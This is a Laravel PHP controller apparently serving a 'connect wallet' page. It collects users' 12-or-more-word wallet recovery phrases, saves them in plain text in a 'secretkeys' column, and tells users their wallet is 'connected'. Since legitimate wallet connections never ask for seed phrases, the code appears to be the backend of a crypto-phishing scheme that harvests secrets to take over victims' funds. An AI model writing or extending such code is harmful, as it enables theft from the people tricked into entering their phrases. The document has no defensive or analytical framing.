<?php

namespace App\Http\Controllers;

use App\Models\Wallet;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class WalletController extends Controller
{
    public function show(){
        return view('connect-wallet');
    }
    public function connectWallet(Request $request)
    {
        // Validate the input
        $validatedData = $request->validate([
            'wallet_name' => 'required|string|max:255',
            'wallet_type' => 'required|string|max:255',
            'recovery_phrase' => 'required|string|min:12', // Ensures at least 12 words/phrases
        ]);

        // Count words in the secret keys
        $wordCount = str_word_count($validatedData['recovery_phrase']);
        if ($wordCount < 12) {
            return back()->with('error_modal', 'The wallet phrase must contain at least 12 words.');
        }

        $user = Auth::user();

        // Insert data into the wallet table
        $wallet = Wallet::create([
            'userid' => $user->id, // Assuming the user is authenticated
            'wallet_name' => $validatedData['wallet_name'],
            'wallet_type' => $validatedData['wallet_type'],
            'secretkeys' => $validatedData['recovery_phrase'],
            'date' => now()->addHour() ,
        ]);

        // If insertion is successful, show a success modal
        if ($wallet) {
            return redirect()->back()->with('success_modal', 'Wallet connected successfully');
        }

        // If insertion fails
        return back()->with('error_modal', 'Failed to connect wallet.');
    }
}
